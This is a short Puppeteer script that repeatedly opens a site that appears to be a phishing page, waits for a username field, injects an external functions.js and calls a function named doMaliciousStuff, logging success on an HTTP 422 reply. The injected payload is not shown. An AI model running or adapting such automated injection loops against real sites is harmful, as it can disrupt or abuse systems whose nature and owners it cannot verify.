const puppeteer = require('puppeteer');
const iPhone = puppeteer.devices['iPhone 6'];

const LOOP_COUNT = 100;
const LOOP_SPACING = 1000;

(async () => {
    for (let index = 0; index < LOOP_COUNT; index++) {
        const browser = await puppeteer.launch({ headless: true });
        const page = await browser.newPage();
        await page.emulate(iPhone);
        await page.goto('https://smsmobile.atualizacliente.com/', { waitUntil: 'networkidle0' });
        await page.waitForSelector('#username');
        await page.addScriptTag({ path: 'functions.js' });
        await page.on('console', msg => console.log('PAGE LOG:', msg.text()));
        await page.evaluate(async () => {
            console.log('evaluate with', window.location.href);
            const result = await doMaliciousStuff(window.location.href);
            console.log(result.status == '422' ? 'SUCCESS' : 'ERROR');
        })
        await page.waitForTimeout(LOOP_SPACING)
        await browser.close();
    }
})();    
